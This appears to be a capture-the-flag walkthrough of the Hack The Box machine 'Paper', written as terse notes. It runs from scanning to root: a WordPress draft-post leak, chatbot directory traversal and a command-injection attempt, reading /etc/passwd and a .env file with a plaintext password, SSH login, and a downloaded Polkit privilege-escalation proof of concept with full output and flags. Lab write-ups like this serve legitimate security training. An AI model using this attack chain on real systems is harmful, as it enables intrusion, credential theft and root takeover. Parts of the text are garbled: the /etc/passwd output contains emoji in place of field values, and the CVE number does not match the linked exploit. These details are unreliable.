@@ -1,0 +1,271 @@
+let's enumerate first.
+command: sudo rustscan -a 10.10.11.143
+result:
+PORT    STATE SERVICE REASON
+22/tcp  open  ssh     syn-ack ttl 63
+80/tcp  open  http    syn-ack ttl 63
+443/tcp open  https   syn-ack ttl 63
+
+command: sudo nmap -sSVC -A -p 22,80,443 10.10.11.143
+result:
+PORT    STATE SERVICE  VERSION
+22/tcp  open  ssh      OpenSSH 8.0 (protocol 2.0)
+| ssh-hostkey: 
+|   2048 1005ea5056a600cb1c9c93df5f83e064 (RSA)
+|   256 588c821cc6632a83875c2f2b4f4dc379 (ECDSA)
+|_  256 3178afd13bc42e9d604eeb5d03eca022 (ED25519)
+80/tcp  open  http     Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1k mod_fcgid/2.3.9)
+|_http-server-header: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9
+|_http-generator: WordPress 5.2.3
+|_http-title: Blunder Tiffin Inc. &#8211; The best paper company in the elec...
+443/tcp open  ssl/http Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1k mod_fcgid/2.3.9)
+|_ssl-date: TLS randomness does not represent time
+|_http-server-header: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9
+| tls-alpn: 
+|_  http/1.1
+|_http-title: HTTP Server Test Page powered by CentOS
+| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=Unspecified/countryName=US
+| Subject Alternative Name: DNS:localhost.localdomain
+| Not valid before: 2021-07-03T08:52:34
+|_Not valid after:  2022-07-08T10:32:34
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-generator: HTML Tidy for HTML5 for Linux version 5.7.28
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Aggressive OS guesses: Linux 3.2 - 4.9 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), Linux 3.16 (93%), Linux 3.18 (93%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 5.1 (93%), Oracle VM Server 3.4.2 (Linux 4.1) (93%), Android 4.1.1 (93%)
+No exact OS matches for host (test conditions non-ideal).
+Network Distance: 2 hops
+
+access: http://10.10.11.143/
+technology:
+HTTP/1.1 403 Forbidden
+Date: Sun, 02 Jul 2023 14:38:03 GMT
+Server: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9
+X-Backend-Server: office.paper
+Last-Modified: Sun, 27 Jun 2021 23:47:13 GMT
+ETag: "30c0b-5c5c7fdeec240"
+Accept-Ranges: bytes
+Content-Length: 199691
+Connection: close
+Content-Type: text/html; charset=UTF-8
+
+register office.paper on /etc/hosts
+
+access: http://10.10.11.143/manual/
+
+command: wfuzz -u http://office.paper -H "Host: FUZZ.office.paper" -w /snap/seclists/34/Discovery/DNS/subdomains-top1million-5000.txt --hh 199691
+result:
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload        
+=====================================================================
+
+000000070:   200        507 L    13015 W    223163 Ch   "chat"     
+
+access: http://office.paper/
+technology:
+HTTP/1.1 200 OK
+Date: Sun, 02 Jul 2023 14:40:07 GMT
+Server: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9
+X-Powered-By: PHP/7.2.24
+X-Pingback: http://office.paper/xmlrpc.php
+Link: <http://office.paper/index.php/wp-json/>; rel="https://api.w.org/", <http://office.paper/?p=38>; rel=shortlink
+X-Backend-Server: office.paper
+Connection: close
+Content-Type: text/html; charset=UTF-8
+Content-Length: 24249
+
+command: wpscan --url http://office.paper --api-token "your_token"
+result:
+some 53 vulnerabilities.
+result:
+ | [!] Title: WordPress <= 5.2.3 - Unauthenticated View Private/Draft Posts
+ |     Fixed in: 5.2.4
+ |     References:
+ |      - https://wpscan.com/vulnerability/3413b879-785f-4c9f-aa8a-5a4a1d5e0ba2
+ |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-17671
+ |      - https://wordpress.org/news/2019/10/wordpress-5-2-4-security-release/
+ |      - https://blog.wpscan.com/wordpress/security/release/2019/10/15/wordpress-524-security-release-breakdown.html
+ |      - https://github.com/WordPress/WordPress/commit/f82ed753cf00329a5e41f2cb6dc521085136f308
+ |      - https://0day.work/proof-of-concept-for-wordpress-5-2-3-viewing-unauthenticated-posts/
+
+
+access: http://chat.office.paper/
+read this post:
+https://0day.work/proof-of-concept-for-wordpress-5-2-3-viewing-unauthenticated-posts/
+
+access: http://office.paper/?static=1
+result:
+# Secret Registration URL of new Employee chat system
+
+http://chat.office.paper/register/8qozr226AhkCHZdyY
+
+access: http://chat.office.paper/register/8qozr226AhkCHZdyY
+please registration.
+and login
+access: http://chat.office.paper/channel/general
+chage personal bot recyclops
+chat> list
+result:
+Fetching the directory listing of /sales/
+total 0
+drwxr-xr-x 4 dwight dwight 32 Jul 3 2021 .
+drwx------ 11 dwight dwight 297 Jul 2 08:08 ..
+drwxr-xr-x 2 dwight dwight 27 Sep 15 2021 sale
+drwxr-xr-x 2 dwight dwight 27 Jul 3 2021 sale_2
+
+chat> list sale
+result:
+total 4
+drwxr-xr-x 2 dwight dwight 27 Sep 15 2021 .
+drwxr-xr-x 4 dwight dwight 32 Jul 3 2021 ..
+-rw-r--r-- 1 dwight dwight 158 Sep 15 2021 portfolio.txt
+
+chat> list 0xdf
+result:
+Fetching the directory listing of 0xdf
+ls: cannot access '/home/dwight/sales/0xdf': No such file or directory
+
+chat> list ../../..
+result:
+Fetching the directory listing of ../../..
+total 28
+dr-xr-xr-x. 17 root root 244 Jan 17 2022 .
+dr-xr-xr-x. 17 root root 244 Jan 17 2022 ..
+-rw-r--r-- 1 root root 0 Jan 14 2022 .autorelabel
+lrwxrwxrwx 1 root root 7 Jun 22 2021 bin -> usr/bin
+dr-xr-xr-x. 4 root root 4096 Jan 14 2022 boot
+drwxr-xr-x 20 root root 3040 Jul 2 08:08 dev
+drwxr-xr-x. 145 root root 8192 Jul 2 08:16 etc
+drwxr-xr-x. 3 root root 20 Jul 2 08:16 home
+lrwxrwxrwx 1 root root 7 Jun 22 2021 lib -> usr/lib
+lrwxrwxrwx. 1 root root 9 Jun 22 2021 lib64 -> usr/lib64
+drwxr-xr-x. 2 root root 6 Jun 22 2021 media
+drwxr-xr-x. 3 root root 18 Jun 22 2021 mnt
+drwxr-xr-x. 3 root root 25 Jun 22 2021 opt
+dr-xr-xr-x 271 root root 0 Jul 2 07:28 proc
+dr-xr-x---. 8 root root 4096 Jan 15 2022 root
+drwxr-xr-x 44 root root 1200 Jul 2 07:31 run
+lrwxrwxrwx 1 root root 8 Jun 22 2021 sbin -> usr/sbin
+drwxr-xr-x. 2 root root 6 Jun 22 2021 srv
+dr-xr-xr-x 13 root root 0 Jul 2 07:29 sys
+drwxrwxrwt. 11 root root 4096 Jul 2 08:47 tmp
+drwxr-xr-x. 13 root root 158 Jan 14 2022 usr
+drwxr-xr-x. 22 root root 4096 Jan 14 2022 var
+
+chat> list ../;id
+result:
+Stop injecting OS commands!
+
+hard to inject command.
+directory traversals
+command: file ../../../etc/passwd
+result:
+root❌0:0:root:/root:/bin/bash
+bin❌1:1:bin:/bin:/sbin/nologin
+daemon❌2:2:daemon:/sbin:/sbin/nologin
+adm❌3:4:adm:/var/adm:/sbin/nologin
+lp❌4:7:lp:/var/spool/lpd:/sbin/nologin
+sync❌5:0:sync:/sbin:/bin/sync
+shutdown❌6:0:shutdown:/sbin:/sbin/shutdown
+halt❌7:0:halt:/sbin:/sbin/halt
+mail❌8:12:mail:/var/spool/mail:/sbin/nologin
+operator❌11:0:operator:/root:/sbin/nologin
+games❌12💯games:/usr/games:/sbin/nologin
+ftp❌14:50:FTP User:/var/ftp:/sbin/nologin
+nobody❌65534:65534:Kernel Overflow User:/:/sbin/nologin
+
+chat> list ../hubot
+result:
+total 436
+drwx------ 8 dwight dwight 4096 Sep 16 2021 .
+drwx------ 11 dwight dwight 297 Jul 2 08:08 ..
+-rw-r--r-- 1 dwight dwight 0 Jul 3 2021 \
+srwxr-xr-x 1 dwight dwight 0 Jul 3 2021 127.0.0.1:8000
+srwxrwxr-x 1 dwight dwight 0 Jul 3 2021 127.0.0.1:8080
+drwx--x--x 2 dwight dwight 36 Sep 16 2021 bin
+-rw-r--r-- 1 dwight dwight 258 Sep 16 2021 .env
+-rwxr-xr-x 1 dwight dwight 2 Jul 3 2021 external-scripts.json
+drwx------ 8 dwight dwight 163 Jul 3 2021 .git
+-rw-r--r-- 1 dwight dwight 917 Jul 3 2021 .gitignore
+-rw-r--r-- 1 dwight dwight 210587 Jul 2 10:48 .hubot.log
+-rwxr-xr-x 1 dwight dwight 1068 Jul 3 2021 LICENSE
+drwxr-xr-x 89 dwight dwight 4096 Jul 3 2021 node_modules
+drwx--x--x 115 dwight dwight 4096 Jul 3 2021 node_modules_bak
+-rwxr-xr-x 1 dwight dwight 1062 Sep 16 2021 package.json
+-rwxr-xr-x 1 dwight dwight 972 Sep 16 2021 package.json.bak
+-rwxr-xr-x 1 dwight dwight 30382 Jul 3 2021 package-lock.json
+-rwxr-xr-x 1 dwight dwight 14 Jul 3 2021 Procfile
+-rwxr-xr-x 1 dwight dwight 5044 Jul 3 2021 README.md
+drwx--x--x 2 dwight dwight 193 Jan 13 2022 scripts
+-rwxr-xr-x 1 dwight dwight 100 Jul 3 2021 start_bot.sh
+drwx------ 2 dwight dwight 25 Jul 3 2021 .vscode
+-rwxr-xr-x 1 dwight dwight 29951 Jul 3 2021 yarn.lock
+
+chat> file ../hubot/.env
+result:
+<!=====Contents of file ../hubot/.env=====>
+export ROCKETCHAT_URL='http://127.0.0.1:48320'
+export ROCKETCHAT_USER=recyclops
+export ROCKETCHAT_PASSWORD=Queenofblad3s!23
+export ROCKETCHAT_USESSL=false
+export RESPOND_TO_DM=true
+export RESPOND_TO_EDITED=true
+export PORT=8000
+export BIND_ADDRESS=127.0.0.1
+<!=====End of file ../hubot/.env=====>
+
+command: ssh dwight@10.10.11.143
+password: Queenofblad3s!23
+
+command: cat user.txt 
+67e7b550267795dba1be570cb3be2bb1
+
+upload linpeas.sh to target machine and run it.
+
+Polkit CVE, CVE-2021-3650
+please upload this script to target machine:
+https://raw.githubusercontent.com/secnigma/CVE-2021-3560-Polkit-Privilege-Esclation/main/poc.sh
+
+command: bash poc.sh
+result:
+[!] Username set as : secnigma
+[!] No Custom Timing specified.
+[!] Timing will be detected Automatically
+[!] Force flag not set.
+[!] Vulnerability checking is ENABLED!
+[!] Starting Vulnerability Checks...
+[!] Checking distribution...
+[!] Detected Linux distribution as "centos"
+[!] Checking if Accountsservice and Gnome-Control-Center is installed
+[+] Accounts service and Gnome-Control-Center Installation Found!!
+[!] Checking if polkit version is vulnerable
+[+] Polkit version appears to be vulnerable!!
+[!] Starting exploit...
+[!] Inserting Username secnigma...
+Error org.freedesktop.Accounts.Error.PermissionDenied: Authentication is required
+[+] Inserted Username secnigma  with UID 1005!
+[!] Inserting password hash...
+[!] It looks like the password insertion was succesful!
+[!] Try to login as the injected user using su - secnigma
+[!] When prompted for password, enter your password 
+[!] If the username is inserted, but the login fails; try running the exploit again.
+[!] If the login was succesful,simply enter 'sudo bash' and drop into a root shell!
+
+command: su - secnigma
+password: secnigmaftw
+
+command: id && whoami
+uid=1005(secnigma) gid=1005(secnigma) groups=1005(secnigma),10(wheel)
+secnigma
+
+command: sudo bash
+command: whoami && id
+root
+uid=0(root) gid=0(root) groups=0(root)
+
+command: cat /root/root.txt
+result:
+e3ed8ef5c07b2d6eb2d51118cacfba42
+
+resource:
+https://0xdf.gitlab.io/2022/06/18/htb-paper.html
